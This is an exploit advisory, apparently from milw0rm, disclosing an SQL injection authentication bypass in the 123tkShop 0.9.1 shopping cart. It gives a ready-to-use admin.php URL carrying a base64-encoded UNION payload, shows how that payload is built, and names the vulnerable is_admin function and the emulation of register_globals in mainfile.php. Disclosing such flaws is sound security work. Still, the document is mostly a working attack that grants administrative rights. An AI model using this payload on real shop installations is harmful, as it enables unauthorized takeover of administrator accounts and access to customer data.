@@ -1,0 +1,29 @@
+By Michael Brooks
+Vulnerability:Sql Injection 
+Software:123tkShop
+Homepage:http://sourceforge.net/projects/my123tkshop/
+Affects Version 0.9.1. 
+
+An attacker can gain Administrative rights with this authentication bypass exploit:
+http://127.0.0.1/123tkShop/shop/admin.php?admin=J3VuaW9uIHNlbGVjdCAncGFzc3dvcmQnLyogOnBhc3N3b3Jk
+The payload for the attack is constructed like this:
+print base64_encode("'union select 'password'/* :password");
+
+Vulneralbe code is in the ./123tkShop/shop/mainfile.php file in the is_admin function starting on line 156
+
+The attack will work magic_quotes_gpc=On or off because of base64_decode()
+The attack will also work with register_globals=Off or On because of mainfile.php line 42:
+if (!ini_get("register_globals")) {
+    import_request_variables('GPC');
+}
+Registering globals is dangerous. 
+
+My advice is to use another shopping cart such as OsCommerce. 
+
+An interesting side note is that this url http://127.0.0.1/123tkShop/shop/admin.php?admin=%22 will produce a message:
+"I don't like you..."
+Interesting sentence,  unfortunately for 123tkShop sentences do not defend against sql injection. 
+
+Merry Christmas. 
+
+# milw0rm.com [2007-12-14]
